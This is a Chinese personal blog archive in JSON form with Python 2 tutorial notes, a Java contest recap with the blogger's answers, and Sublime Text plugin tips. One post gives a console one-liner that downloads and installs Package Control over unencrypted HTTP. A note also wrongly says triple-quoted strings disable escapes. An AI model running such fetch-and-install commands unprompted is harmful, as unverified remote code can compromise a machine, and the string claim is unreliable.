循环正常执行完毕，或者（while 语句的条件判断结果为 false 时） 如果 for 语句或者 while 语句在半途中被 break 掉，那么将不会执行 else 子句中的内容 关于 continue 语句，也直接来看例子就好了，用法跟其他流行刘系语言中的 continue 的基本一致，用于结束本次循环的执行体，跳转到下一次循环 判断 2-9 中的奇数和偶数1234567891011121314&gt;&gt;&gt; for num in range(2, 10):... if num % 2 == 0:... print 'Found an even number', num... continue... print 'Found a number', num... Found an even number 2Found a number 3Found an even number 4Found a number 5Found an even number 6Found a number 7Found an even number 8Found a number 9 顺带一提 pass 语句，感觉这是基本用不到的东西，就不单独另外开贴说了 这个语句在编程中应该算是个概念语句，它不做具体的东西，它只是一个默默的占位符一样的东西 它的意思就是去执行下一条语句 官方给了个很有意思的例子12345678910111213&gt;&gt;&gt; while True:... pass # 你只有用 Cirl+C 才能终止我 ...dfadsfsadfsdfadsfer^CTraceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;KeyboardInterrupt 这玩意我现在看来就是个玩具，只是用来玩的东西而已 不过 python 既然把它作为标准关键字之一的话，那可能有点实用价值，等我以后发觉了再回来补充吧","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[{"name":"PYTHON","slug":"PYTHON","permalink":"https://hexo.bangz.me/tags/PYTHON/"}]},{"title":"python 流程控制——range 函数的使用","slug":"66","date":"2015-04-20T08:55:00.000Z","updated":"2018-06-08T08:51:54.000Z","comments":true,"path":"archives/python-flow-control-using-range-function.html","link":"","permalink":"https://hexo.bangz.me/archives/python-flow-control-using-range-function.html","excerpt":"这次出于疏忽，忘记在晚上断网之前打开 python 中文教程的页面了，11 点实在是早，也不想干别的，也就是想学学 python，还好我手头上有保存一份官方的英文教程，就拿出来看了。 虽然以前玩游戏经常都是看英语，当时也很喜欢英语，不过现在觉得英语看的多了眼花，实在是没有咱们简体中文这种舒服的感觉，方方正正的，果然汉字还是很好看，哈哈！ 本人承认本人英语并不是很好很好，只是刚好过了个 CET-4 的水平，计算机英语的水平也是靠积累来的。 就这样，看了下英文版的官方文档，居然有了重大发现！ 某 pythondoc 的官方教程翻译版对于 range 的说法和这个 python 官方原版英文教程的说法不一样！ 人家官方说 range 函数只是生成一个列表，那边的中文翻译居然说是生成一个链表。。。。 果然还是看原版教程才不会被坑啊。。。 不废话了，讲讲正题。","text":"这次出于疏忽，忘记在晚上断网之前打开 python 中文教程的页面了，11 点实在是早，也不想干别的，也就是想学学 python，还好我手头上有保存一份官方的英文教程，就拿出来看了。 虽然以前玩游戏经常都是看英语，当时也很喜欢英语，不过现在觉得英语看的多了眼花，实在是没有咱们简体中文这种舒服的感觉，方方正正的，果然汉字还是很好看，哈哈！ 本人承认本人英语并不是很好很好，只是刚好过了个 CET-4 的水平，计算机英语的水平也是靠积累来的。 就这样，看了下英文版的官方文档，居然有了重大发现！ 某 pythondoc 的官方教程翻译版对于 range 的说法和这个 python 官方原版英文教程的说法不一样！ 人家官方说 range 函数只是生成一个列表，那边的中文翻译居然说是生成一个链表。。。。 果然还是看原版教程才不会被坑啊。。。 不废话了，讲讲正题。 range 这个函数可以一次性生成一个数值序列列表，列表里的数值依次递增 比如这样12&gt;&gt;&gt; range(10)[0, 1, 2, 3, 4, 5, 6, 7, 8, 9] 看着这玩意，再想想前面的 for 循环和 while 循环，貌似发现了什么 果然，人家官方教程讲出来了，这玩意解决了 foreach 语句的计数器问题1234567891011&gt;&gt;&gt; a = ['Mary', 'had', 'a', 'little', 'lamb']&gt;&gt;&gt; a['Mary', 'had', 'a', 'little', 'lamb']&gt;&gt;&gt; for i in range(len(a)):... print i, a[i]... 0 Mary1 had2 a3 little4 lamb 原来一直以为 foreach 语句的最大弊端是不能够控制计数变量，所以在 java 里面就算有这个语句也基本不用，但是 python 很好的解决了这个问题。 range 函数还可以生成等差数列12&gt;&gt;&gt; range(0, 15, 2)[0, 2, 4, 6, 8, 10, 12, 14] 进而可以很轻松的就进行这样的特殊操作123456789&gt;&gt;&gt; a = 'abcdefghijklmn'&gt;&gt;&gt; for i in range(0, len(a), 3):... print i, a[i]... 0 a3 d6 g9 j12 m range 函数生成的列表不一定要从零开始哦12&gt;&gt;&gt; range(5, 14)[5, 6, 7, 8, 9, 10, 11, 12, 13] 这样，就可以总结出三个 range 函数的三种参数形式了range(length) range(start, length) range(start, length, delta) 不管怎么说，这个 range 函数我感觉真的是 python 的一个让我眼前一亮的东西，配合循环一起食用效果更佳！ 附上一个自己写的用来玩的简单冒泡排序123456789101112131415161718192021222324&gt;&gt;&gt; a = [5, 4, 7, 2, 6, 3, 1, 8]&gt;&gt;&gt; for i in range(len(a)-1):... for j in range(len(a)-1-i):... if a[j] &gt; a[j+1]:... t = a[j+1]... a[j+1] = a[j]... a[j] = t... print a... [4, 5, 7, 2, 6, 3, 1, 8][4, 5, 2, 7, 6, 3, 1, 8][4, 5, 2, 6, 7, 3, 1, 8][4, 5, 2, 6, 3, 7, 1, 8][4, 5, 2, 6, 3, 1, 7, 8][4, 2, 5, 6, 3, 1, 7, 8][4, 2, 5, 3, 6, 1, 7, 8][4, 2, 5, 3, 1, 6, 7, 8][2, 4, 5, 3, 1, 6, 7, 8][2, 4, 3, 5, 1, 6, 7, 8][2, 4, 3, 1, 5, 6, 7, 8][2, 3, 4, 1, 5, 6, 7, 8][2, 3, 1, 4, 5, 6, 7, 8][2, 1, 3, 4, 5, 6, 7, 8][1, 2, 3, 4, 5, 6, 7, 8]","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[{"name":"PYTHON","slug":"PYTHON","permalink":"https://hexo.bangz.me/tags/PYTHON/"}]},{"title":"说下今天甲骨文杯的考试","slug":"65","date":"2015-04-18T06:25:00.000Z","updated":"2018-06-08T08:50:38.000Z","comments":true,"path":"archives/talk-about-the-tournament-of-oracle.html","link":"","permalink":"https://hexo.bangz.me/archives/talk-about-the-tournament-of-oracle.html","excerpt":"这学期报了华农的甲骨文杯的 Java 比赛，打算在竟考网和其他高校的高手们拼一拼。 咱这学校报名的也就十支队伍左右，三十来个人，就我们团队找了指导老师。 听老师说，这考试以前就叫华农的 Java 比赛，是一个很普通的比赛而已，今天弄得特别高大上，好象是因为拉到了甲骨文公司的合作关系 所以今年的名字叫做甲骨文杯了。我看报名人数三千多人，也挺热闹的。于是就拉了两个同学一起来战 今天是初赛第一次考试，咱们三个约好 9 点，大家收拾好东西，就开始向实验室奔去了 到了实验室，时间还有十分钟，匆忙拿出了笔记本，插好电源开机。 不得不说，这回咱们三个人的组合还真是有点厉害。 一个同学拿着 MacBook，用的 Mac OS X，我拿着自己的神船，用的 linuxmint，还有一个同学拿着华硕，用的 windows。 PC 三大阵营都跑出来了，看着好像很厉害的样子 2333。 于是咱们按照竟考网约定的时间有打开浏览器准备开始进入答题，约定的时间是九点半到十点登录考试系统 结果咱们在登录的时候一直卡，咱们实验室用的学校的千兆光纤，却怎么也进不去他们的服务器，还经常弹 502 错误 估计是他们那边负载爆了，咱们就这样一直 F5，像挤公交车一样去挤网站的感觉。","text":"这学期报了华农的甲骨文杯的 Java 比赛，打算在竟考网和其他高校的高手们拼一拼。 咱这学校报名的也就十支队伍左右，三十来个人，就我们团队找了指导老师。 听老师说，这考试以前就叫华农的 Java 比赛，是一个很普通的比赛而已，今天弄得特别高大上，好象是因为拉到了甲骨文公司的合作关系 所以今年的名字叫做甲骨文杯了。我看报名人数三千多人，也挺热闹的。于是就拉了两个同学一起来战 今天是初赛第一次考试，咱们三个约好 9 点，大家收拾好东西，就开始向实验室奔去了 到了实验室，时间还有十分钟，匆忙拿出了笔记本，插好电源开机。 不得不说，这回咱们三个人的组合还真是有点厉害。 一个同学拿着 MacBook，用的 Mac OS X，我拿着自己的神船，用的 linuxmint，还有一个同学拿着华硕，用的 windows。 PC 三大阵营都跑出来了，看着好像很厉害的样子 2333。 于是咱们按照竟考网约定的时间有打开浏览器准备开始进入答题，约定的时间是九点半到十点登录考试系统 结果咱们在登录的时候一直卡，咱们实验室用的学校的千兆光纤，却怎么也进不去他们的服务器，还经常弹 502 错误 估计是他们那边负载爆了，咱们就这样一直 F5，像挤公交车一样去挤网站的感觉。 刷到十点钟的时候，还是进不去，我当时就说，推迟考试的邮件要来了。 TMD 偏偏这玩意迟迟不来，在竟考网甲骨文杯的考试首页写着这玩意： 本大赛初赛具体时间如下：参赛选手可以在 4 月 18 日 09:30 到 10:00 期间登录竞赛首页并点击考试按钮进入考试，进入考试后将有 90 分钟的做题时间，最迟交卷时间为 11:30。如果 18 号考试发生异常情况，将启用备考系统：考试在第二天（4 月 19 日周日）下午进行，进入考试时间为 4 月 19 日下午 14:30 到 15:00，考试时长 90 分钟，最迟交卷时间为 16:30。若 18 号顺利考试，将不启用备考系统。 原来他们是预着今天会出事的，连备考系统都想到了 = = 我就说，既然这样，肯定要推迟了，咱们就在实验室随便玩玩然后回去吧。 有个同学中途不愿意在那玩，跑回宿舍了。 我和另外一个一直聊天，聊着聊着聊到了 11 点多，这时出于无聊的心态，我又一次点进了考试 这时，我看到了入口页的这句话： 故障已经修复，18 号 11 点之前都可以进入考试，请大家尽快进入考试。 恶心的事情发生了！！！这时候居然能够正常考试了，他们没有发推迟通知！没错，就是现在，答题吧！ fxxk!!! 看到这个情况，咱们都无语了，说好的时间呢，说好的信用呢？ 我马上打电话找到那个回了宿舍的同学，叫他马上登录考试 tm 咱这才没有错过这场考试 = = 而且我进入考试的时间是 11 点 13 分，考试时间 90 分钟，考完都 TM 一点了。。。午饭不用吃了 qwq 没有办法，咱们马上开始答题，咱们三个互相交流了一下，看到题目都一样 这时咱们马上随机应变，做了分工，所以战绩还算不错，最后只差两条编程题没有做出来 其中一条题目是关于泛型和可变参数的，这个不得不说，咱们太紧张了，当时咱们花了近一个小时都没写出来。 考完之后，我把原来的程序删了，把整个程序重新写过，写完之后发现才花了十分钟。。。 另外一条题目是简单 Java 类的，不知怎么回事，怎么写都评判不通过 好了，抱怨完了，我把今天考到的题目整理一下发上来 预览图： 答案： 答案整合1-10 AEFBC DEABE11-20 BEDFB CDEBA21 ACF22 BD23 ACF24 ABF25 AC26 AE27 i5, i6, i1, i2, i3, i428 429123456789101112public class Adder&#123; public static int add(int a, int b)&#123; return a + b; &#125; public static double add(double a, double b)&#123; return a + b; &#125; public static String add(String a, String b)&#123; String c = a + b; return c; &#125;&#125; 3012345678910111213141516171819202122import java.util.*;public class ToList&lt;T&gt; &#123; private List&lt;T&gt; mylist; public ToList() &#123; mylist = new ArrayList&lt;T&gt;(); &#125; public ToList add(T ... o) &#123; for (T temp : o) &#123; mylist.add(temp); &#125; return this; &#125; public List&lt;T&gt; toList() &#123; return this.mylist; &#125; public static &lt;T&gt; ToList create(T ... o) &#123; ToList&lt;T&gt; tolist1 = new ToList&lt;T&gt;(); tolist1.add(o); return tolist1; &#125;&#125; 311234567891011121314151617181920212223public class Person &#123; private String name; private int age; public Person() &#123; this(null, 0); &#125; public Person(String name,int age)&#123; this.name = name; this.age = age; &#125; public String getName()&#123; return name; &#125; public void setName(String name)&#123; this.name = name; &#125; public int getAge()&#123; return age; &#125; public void setAge(int age)&#123; this.age = age; &#125;&#125;","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://hexo.bangz.me/tags/Java/"}]},{"title":"python 流程控制——基本控制语句","slug":"64","date":"2015-04-16T08:47:00.000Z","updated":"2018-06-08T08:38:56.000Z","comments":true,"path":"archives/python-flow-control-statements.html","link":"","permalink":"https://hexo.bangz.me/archives/python-flow-control-statements.html","excerpt":"顺序结构 分支结构 if 语句 循环结构 for 语句 while 语句 先说分支结构，最基础的是 if 语句12345678910111213&gt;&gt;&gt; x = int(raw_input(\"Please enter an integer:\"))Please enter an integer: 42&gt;&gt;&gt; if x &lt; 0:... x = 0... print \"Negative changed to zero\"... elif x == 0:... print \"Zero\"... elif x == 1:... print \"Single\"... else:... print \"More\"... More","text":"顺序结构 分支结构 if 语句 循环结构 for 语句 while 语句 先说分支结构，最基础的是 if 语句12345678910111213&gt;&gt;&gt; x = int(raw_input(\"Please enter an integer:\"))Please enter an integer: 42&gt;&gt;&gt; if x &lt; 0:... x = 0... print \"Negative changed to zero\"... elif x == 0:... print \"Zero\"... elif x == 1:... print \"Single\"... else:... print \"More\"... More python 在这里放弃掉了其他语言里的 switch 和 case 语句（其实我也觉得 switch 语句真的很难用），全部用 if 语句来实现了，所以分支结构里面只有 if 语句 这里用到了输入流 raw_input，这个函数用于提示用户输入数据，参数里面的字符串是提示信息 再用 int() 函数把输入流的数据转换为整数 elif 是 else if 的缩写，使用这个缩写使代码看上去更整洁，也避免了过深的缩进 在看官方教程的时候，发现它是用 range 函数来讲解循环的，我在这里先不弄那么复杂，先用传统的方法尝试下循环 首先是前面用到的 while 循环，在列表上的应用 1234567&gt;&gt;&gt; a = [0, 1, 4, 5, 7, 1, 5, 7, 23, 5, 4]&gt;&gt;&gt; i = 0&gt;&gt;&gt; while i &lt; len(a):... print a[i],... i = i + 1... 0 1 4 5 7 1 5 7 23 5 4 这时候再看看 for 循环的写法，优势就开始体现出来了 12345&gt;&gt;&gt; a = [0, 1, 4, 5, 7, 1, 5, 7, 23, 5, 4]&gt;&gt;&gt; for i in a:... print i,... 0 1 4 5 7 1 5 7 23 5 4 这种 for 循环应该算是一种 foreach 语句了，i 变量在这里不做计数变量，而是做存放 a 列表中的数据的临时变量","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[{"name":"PYTHON","slug":"PYTHON","permalink":"https://hexo.bangz.me/tags/PYTHON/"}]},{"title":"python 流程控制——菲波那契序列","slug":"63","date":"2015-04-16T08:19:00.000Z","updated":"2018-06-08T08:34:32.000Z","comments":true,"path":"archives/python-flow-control-fibonacci-demo.html","link":"","permalink":"https://hexo.bangz.me/archives/python-flow-control-fibonacci-demo.html","excerpt":"官方教程里给的这个例子相当不错123456789101112131415&gt;&gt;&gt; a, b = 0, 1&gt;&gt;&gt; a0&gt;&gt;&gt; b1&gt;&gt;&gt; while b &lt; 10 :... print b... a, b = b, a+b... 112358 说这个例子好的原因是，它很直观的阐明了 python 的一些特性首先，多重赋值这个东西就很抢眼，a, b = 0, 1 这一语句能同时给 a 和 b 这两个变量分别赋不同的值，而且一行搞定","text":"官方教程里给的这个例子相当不错123456789101112131415&gt;&gt;&gt; a, b = 0, 1&gt;&gt;&gt; a0&gt;&gt;&gt; b1&gt;&gt;&gt; while b &lt; 10 :... print b... a, b = b, a+b... 112358 说这个例子好的原因是，它很直观的阐明了 python 的一些特性首先，多重赋值这个东西就很抢眼，a, b = 0, 1 这一语句能同时给 a 和 b 这两个变量分别赋不同的值，而且一行搞定 接着是 while 循环的条件表达式，不需要加括号，只需在条件表达式之后加一个冒号，表示条件判断结束 再者，while 循环体里面不需要用大括号把多行语句给包起来，区分 while 循环执行体的方法是看缩进，缩进了就说明是 while 循环体的执行语句 条件表达式的基本运算符也跟 C 语言一样 &lt; 、&gt;、==、!=、&lt;=、&gt;= print 关键字也是自带换行的，它可以同时 print 多个参数的数据，不同参数之间使用逗号分隔开123&gt;&gt;&gt; i = 256*256&gt;&gt;&gt; print 'The value of i is', iThe value of i is 65536 使用一个逗号可以使 print 关键字输出后不换行123456&gt;&gt;&gt; a, b = 0, 1&gt;&gt;&gt; while b &lt; 1000:... print b,... a, b = b, a+b... 1 1 2 3 5 8 13 21 34 55 89 144 233 377 610 987","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[{"name":"PYTHON","slug":"PYTHON","permalink":"https://hexo.bangz.me/tags/PYTHON/"}]},{"title":"python 基础——列表","slug":"61","date":"2015-04-15T20:40:00.000Z","updated":"2018-06-08T08:33:46.000Z","comments":true,"path":"archives/python-basic-of-list.html","link":"","permalink":"https://hexo.bangz.me/archives/python-basic-of-list.html","excerpt":"在说这个之前，简单的对 unicode 字符串对象的做一下笔记吧 python 是原生支持 Unicode 的，使用 unicode 的字符串时只需要在字符串前加个 “u”12&gt;&gt;&gt; u'Hello\\u0020World !'u'Hello World !' 对于 python 的列表，其实可以理解为数组，不过这种数组不是普通的数组，它是可以支持不同类型数据的增强型数组123456789&gt;&gt;&gt; a = ['spam', 'eggs', 100, 124]&gt;&gt;&gt; a['spam', 'eggs', 100, 124]&gt;&gt;&gt; a[0]'spam'&gt;&gt;&gt; a[3]124&gt;&gt;&gt; a[1:-1]['eggs', 100]","text":"在说这个之前，简单的对 unicode 字符串对象的做一下笔记吧 python 是原生支持 Unicode 的，使用 unicode 的字符串时只需要在字符串前加个 “u”12&gt;&gt;&gt; u'Hello\\u0020World !'u'Hello World !' 对于 python 的列表，其实可以理解为数组，不过这种数组不是普通的数组，它是可以支持不同类型数据的增强型数组123456789&gt;&gt;&gt; a = ['spam', 'eggs', 100, 124]&gt;&gt;&gt; a['spam', 'eggs', 100, 124]&gt;&gt;&gt; a[0]'spam'&gt;&gt;&gt; a[3]124&gt;&gt;&gt; a[1:-1]['eggs', 100] 这个数组可以任意拼接12&gt;&gt;&gt; 3*a[:2] + ['bacon', 2*2]['spam', 'eggs', 'spam', 'eggs', 'spam', 'eggs', 'bacon', 4] 不同于前面学的字符串，这个列表还可以任意修改1234567&gt;&gt;&gt; a['spam', 'eggs', 100, 124]&gt;&gt;&gt; a[2]+32132&gt;&gt;&gt; a[2]=a[2]+32&gt;&gt;&gt; a['spam', 'eggs', 132, 124] 可以自由的任意增加和删除元素123456789101112131415161718192021222324&gt;&gt;&gt; a[0:2] = ['haha', 120]&gt;&gt;&gt; a['haha', 120, 132, 124]&gt;&gt;&gt; a[0:2] = []&gt;&gt;&gt; a[132, 124]&gt;&gt;&gt; a[1:1] = ['bletch', 'xyzzy']&gt;&gt;&gt; a[132, 'bletch', 'xyzzy', 124]&gt;&gt;&gt; a[1:1] = [3*'qwert']&gt;&gt;&gt; a[132, 'qwertqwertqwert', 'bletch', 'xyzzy', 124]&gt;&gt;&gt; a[1:1] = [3*\"qwert\"]&gt;&gt;&gt; a[132, 'qwertqwertqwert', 'qwertqwertqwert', 'bletch', 'xyzzy', 124]&gt;&gt;&gt; a[1] = []&gt;&gt;&gt; a[132, [], 'qwertqwertqwert', 'bletch', 'xyzzy', 124]&gt;&gt;&gt; a[1:1] = []&gt;&gt;&gt; a[132, [], 'qwertqwertqwert', 'bletch', 'xyzzy', 124]&gt;&gt;&gt; a[1:2] = []&gt;&gt;&gt; a[132, 'qwertqwertqwert', 'bletch', 'xyzzy', 124] 特殊操作：列表中插入其他列表的元素12345&gt;&gt;&gt; a[132, 'qwertqwertqwert', 'bletch', 'xyzzy', 124]&gt;&gt;&gt; a[:0] = a&gt;&gt;&gt; a[132, 'qwertqwertqwert', 'bletch', 'xyzzy', 124, 132, 'qwertqwertqwert', 'bletch', 'xyzzy', 124] 特殊操作：删除列表中所有元素123&gt;&gt;&gt; a[:] = []&gt;&gt;&gt; a[] len 函数一样可以用于求列表长度操作1234&gt;&gt;&gt; a['spam', 'eggs', 100, 123]&gt;&gt;&gt; len(a)4 python 中的列表可以嵌套列表12345678910&gt;&gt;&gt; q = [2, 3]&gt;&gt;&gt; p = [1, q, 4]&gt;&gt;&gt; p[1, [2, 3], 4]&gt;&gt;&gt; len(p)3&gt;&gt;&gt; len(p[1])2&gt;&gt;&gt; p[1][0]2 下面的例子可以说明，p 和 q 都只是指针12345&gt;&gt;&gt; p[1].append('xtra')&gt;&gt;&gt; q[2, 3, 'xtra']&gt;&gt;&gt; p[1, [2, 3, 'xtra'], 4]","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[{"name":"PYTHON","slug":"PYTHON","permalink":"https://hexo.bangz.me/tags/PYTHON/"}]},{"title":"python 基础——字符串","slug":"60","date":"2015-04-15T20:19:00.000Z","updated":"2018-06-08T08:32:08.000Z","comments":true,"path":"archives/python-basic-of-string.html","link":"","permalink":"https://hexo.bangz.me/archives/python-basic-of-string.html","excerpt":"python 中对于字符串的处理，也是相当厉害的 不仅支持传统编程语言中的双引号模式，也支持 shell 中的单引号模式，甚至还可以用三引号一次搞定多行字符串！ 一对单引号的模式12345678&gt;&gt;&gt; 'spam eggs''spam eggs'&gt;&gt;&gt; 'doesn\\'t'\"doesn't\"&gt;&gt;&gt; '\"Yes,\" he said.''\"Yes,\"he said.'&gt;&gt;&gt; '\"Isn\\'t,\"she said.''\"Isn\\'t,\"she said.'","text":"python 中对于字符串的处理，也是相当厉害的 不仅支持传统编程语言中的双引号模式，也支持 shell 中的单引号模式，甚至还可以用三引号一次搞定多行字符串！ 一对单引号的模式12345678&gt;&gt;&gt; 'spam eggs''spam eggs'&gt;&gt;&gt; 'doesn\\'t'\"doesn't\"&gt;&gt;&gt; '\"Yes,\" he said.''\"Yes,\"he said.'&gt;&gt;&gt; '\"Isn\\'t,\"she said.''\"Isn\\'t,\"she said.' 一对双引号的模式12345678910&gt;&gt;&gt; \"\\\"Yes,\\\"he said.\"'\"Yes,\" he said.'&gt;&gt;&gt; hello = \"This is a rather long string containing\\n\\... several lines of text just as you would do in C.\\n\\... Note that whitespace at the beginning of the line is\\... significant.\"&gt;&gt;&gt; print helloThis is a rather long string containingseveral lines of text just as you would do in C. Note that whitespace at the beginning of the line is significant. 一对三引号的模式12345678&gt;&gt;&gt; print \"\"\"\\... Usage: thingy [OPTIONS]... -h Display this usage message... -H hostname Hostname to connect to... \"\"\"Usage: thingy [OPTIONS] -h Display this usage message -H hostname Hostname to connect to 总结： 如果字符串中只包含单引号，不包含双引号，那就可以用一对双引号给包起来 如果字符串中之包含双引号，不包含单引号，那就可以用一对单引号给包起来 当需要使用多行的字符串时，可以使用一对三引号，被三引号给包起来的所有内容不进行转义，即所有转义字符无效 同时，还可以使用 “原始” 字符串，与三引号具有同样的效果，只需要在引号前面加个“r”12345&gt;&gt;&gt; hello = r\"This is a rather long string containing\\n\\... several lines of text much as you would do in C.\"&gt;&gt;&gt; print(hello)This is a rather long string containing\\n\\several lines of text much as you would do in C. 字符串还可以任意拼接和重复12&gt;&gt;&gt; '&lt;' + 'niko'*5 + '&gt;''&lt; niko niko niko niko niko &gt;' 相邻的两个引号内的字符串即使不用加号也会自动拼接在一起，但在调用方法时不适用123456789&gt;&gt;&gt; 'str' 'ing' # &lt;- This is ok'string'&gt;&gt;&gt; 'str'.strip() + 'ing' # &lt;- This is ok'string'&gt;&gt;&gt; 'str'.strip() 'ing' # &lt;- This is invalid File \"&lt;stdin&gt;\", line 1, in ? 'str'.strip() 'ing' ^SyntaxError: invalid syntax 可以使用冒号来取任意长度的连续字符串123456789&gt;&gt;&gt; word = 'str' 'ing'&gt;&gt;&gt; word[4] # 取 4'n'&gt;&gt;&gt; word[2:] #2 到最后'ring'&gt;&gt;&gt; word[:2] # 最前到 2'st'&gt;&gt;&gt; word[0:2] # 取 0-2'st' python 字符串定义后为常量，不可任意修改其中的某个字符1234&gt;&gt;&gt; word[2] = 'k'Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;TypeError: 'str' object does not support item assignment 索引也可以为负值，即自右向左算1234&gt;&gt;&gt; word[-2:]'ng'&gt;&gt;&gt; word[:-2]'stri' -0 其实就是 0，官方给出的示例索引表如下 12345 +---+---+---+---+---+ | H | e | l | p | A | +---+---+---+---+---+ 0 1 2 3 4 5-5 -4 -3 -2 -1 字符串求长度函数为 len()123&gt;&gt;&gt; s = 'jreiouwtndouijfnbvioftretjk'&gt;&gt;&gt; len(s)27","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[{"name":"PYTHON","slug":"PYTHON","permalink":"https://hexo.bangz.me/tags/PYTHON/"}]},{"title":"python 基础——计算器","slug":"58","date":"2015-04-15T08:52:00.000Z","updated":"2018-06-08T08:27:59.000Z","comments":true,"path":"archives/using-python-as-a-calculator.html","link":"","permalink":"https://hexo.bangz.me/archives/using-python-as-a-calculator.html","excerpt":"python 的基本交互界面的确很强大，前面已经试过了一些，现在来试一些更有趣的东西 python 当成表达式计算器使用 直接在交互界面输入表达式就会返回计算结果12&gt;&gt;&gt; (50-5*6)/45 也可以使用变量来计算1234&gt;&gt;&gt; width = 20&gt;&gt;&gt; height = 5*9&gt;&gt;&gt; width * height900 当然也支持浮点数运算","text":"python 的基本交互界面的确很强大，前面已经试过了一些，现在来试一些更有趣的东西 python 当成表达式计算器使用 直接在交互界面输入表达式就会返回计算结果12&gt;&gt;&gt; (50-5*6)/45 也可以使用变量来计算1234&gt;&gt;&gt; width = 20&gt;&gt;&gt; height = 5*9&gt;&gt;&gt; width * height900 当然也支持浮点数运算12&gt;&gt;&gt; 3 * 3.75 / 1.57.5 （这简直让我感觉不到浮点数的存在，浮点数小数部分的处理实在是太舒服了） 令我惊讶的是，连复数的运算都可以！12345678910&gt;&gt;&gt; a = 1.5+0.5j&gt;&gt;&gt; b = complex(3, 3.5)&gt;&gt;&gt; a.real1.5&gt;&gt;&gt; b.real3.0&gt;&gt;&gt; a.imag0.5&gt;&gt;&gt; b.imag3.5 使用 abs 函数可以求复数的模1234&gt;&gt;&gt; abs(a)1.5811388300841898&gt;&gt;&gt; abs(b)4.6097722286464435 使用 “_” 这个符号可以直接把前一个计算结果拿出来用12345678&gt;&gt;&gt; tax = 12.5 / 100&gt;&gt;&gt; price = 100.50&gt;&gt;&gt; price * tax12.5625&gt;&gt;&gt; price + _113.0625&gt;&gt;&gt; round(_, 2) # 四舍五入113.06","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[{"name":"PYTHON","slug":"PYTHON","permalink":"https://hexo.bangz.me/tags/PYTHON/"}]},{"title":"Sublime Text 3 常用插件以及安装方法","slug":"36","date":"2015-04-12T03:30:00.000Z","updated":"2018-06-08T08:26:53.000Z","comments":true,"path":"archives/sublime-text-3-useful-plugins.html","link":"","permalink":"https://hexo.bangz.me/archives/sublime-text-3-useful-plugins.html","excerpt":"安装 Sublime Text 3 插件的方法： 直接安装安装 Sublime text 3 插件很方便，可以直接下载安装包解压缩到 Packages 目录（菜单 -&gt;preferences-&gt;packages）。 使用 Package Control 组件安装也可以安装 package control 组件，然后直接在线安装： 按 Ctrl+` 调出 console（注：安装有 QQ 输入法的这个快捷键会有冲突的，输入法属性设置 - 输入法管理 - 取消热键切换至 QQ 拼音） 粘贴以下代码到底部命令行并回车： 1import urllib.request,os; pf = 'Package Control.sublime-package'; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); open(os.path.join(ipp, pf), 'wb').write(urllib.request.urlopen( 'http://sublime.wbond.net/' + pf.replace('','%20')).read()) 重启 Sublime Text 3。 如果在 Perferences-&gt;package settings 中看到 package control 这一项，则安装成功。","text":"安装 Sublime Text 3 插件的方法： 直接安装安装 Sublime text 3 插件很方便，可以直接下载安装包解压缩到 Packages 目录（菜单 -&gt;preferences-&gt;packages）。 使用 Package Control 组件安装也可以安装 package control 组件，然后直接在线安装： 按 Ctrl+` 调出 console（注：安装有 QQ 输入法的这个快捷键会有冲突的，输入法属性设置 - 输入法管理 - 取消热键切换至 QQ 拼音） 粘贴以下代码到底部命令行并回车： 1import urllib.request,os; pf = 'Package Control.sublime-package'; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); open(os.path.join(ipp, pf), 'wb').write(urllib.request.urlopen( 'http://sublime.wbond.net/' + pf.replace('','%20')).read()) 重启 Sublime Text 3。 如果在 Perferences-&gt;package settings 中看到 package control 这一项，则安装成功。 顺便贴下 Sublime Text2 的代码1import urllib2,os; pf='Package Control.sublime-package'; ipp = sublime.installed_packages_path(); os.makedirs( ipp ) if not os.path.exists(ipp) else None; urllib2.install_opener( urllib2.build_opener( urllib2.ProxyHandler( ))); open( os.path.join( ipp, pf), 'wb' ).write( urllib2.urlopen( 'http://sublime.wbond.net/' +pf.replace( '','%20' )).read()); print( 'Please restart Sublime Text to finish installation') 用 Package Control 安装插件的方法： 按下 Ctrl+Shift+P 调出命令面板 输入 install 调出 Install Package 选项并回车，然后在列表中选中要安装的插件。 不爽的是，有的网络环境可能会不允许访问陌生的网络环境从而设置一道防火墙，而 Sublime Text 2 貌似无法设置代理，可能就获取不到安装包列表了。好，方法介绍完了，下面是本文正题，一些有用的 Sublime Text 2 插件： GBK Encoding Support对应 gb2312 来说，Sublime Text 2 本生不支持的，我们可以通过 Ctrl+Shift+P 调出命令面板或 Perferences-&gt;Package Contro, 输入 install 调出 Install Package 选项并回车，在输入 “GBK Encoding Support” 选择开始安装，左下角状态栏有提示安装成功。这时打开 gbk 编码的文件就不会出现乱码了，如果有需要转成 utf-8 的可以在 File-GBK to UTF8 - 选择 Save with UTF8 就偶看了。 Zen Coding这个，不解释了，还不知道 ZenCoding 的同学强烈推荐去看一下：《Zen Coding: 一种快速编写 HTML/CSS 代码的方法》。emmetPS:Zen Coding for Sublime Text 2 插件的开发者已经停止了在 Github 上共享了，现在只有通过 Package Control 来安装。 jQuery Package for sublime Text如果你离不开 jQuery 的话，这个必备～～ Sublime PrefixrPrefixr，CSS3 私有前缀自动补全插件，显然也很有用哇Sublime Prefixr JS Format一个 JS 代码格式化插件。 SublimeLinter一个支持 lint 语法的插件，可以高亮 linter 认为有错误的代码行，也支持高亮一些特别的注释，比如“TODO”，这样就可以被快速定位。（IntelliJ IDEA 的 TODO 功能很赞，这个插件虽然比不上，但是也够用了吧）SublimeLinter 